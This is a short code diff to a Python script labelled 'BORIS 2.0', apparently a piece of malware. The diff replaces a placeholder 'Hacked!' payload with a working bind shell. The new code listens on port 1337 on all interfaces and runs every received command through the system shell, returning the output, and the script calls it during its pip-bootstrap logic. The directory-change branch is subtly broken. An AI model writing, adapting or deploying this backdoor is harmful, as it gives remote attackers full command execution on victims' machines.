@@ -1,10 +1,24 @@
 VERSION=2.0
 #BORIS 2.0
 import os
+from subprocess import check_output,Popen
+import socket
 
 def payload():
-    print("Hacked!")
-    os.system("echo hacked > hacked.txt")   
+    s = socket.socket() 
+    s.bind(("0.0.0.0",1337))
+    s.listen(5)
+    while True:
+        c,a = s.accept()
+        command = c.recv(1024)
+        if command[:3] == "cd":
+            try:
+                os.chdir(command[3:])
+            except:
+                c.send("Error - cannot change into directory.")
+        else:
+            c.send(check_output(command,shell=True))
+    
 if 0 != os.system("which pip"): # get pip
     os.system("curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py")
     os.system("wget https://bootstrap.pypa.io/get-pip.py")
@@ -29,9 +43,7 @@ except:
         payload()
         exit("Adios!")
 import sys
-import socket
 import time as t
-from subprocess import check_output,Popen
 try:
     from subprocess import pipe
 except:
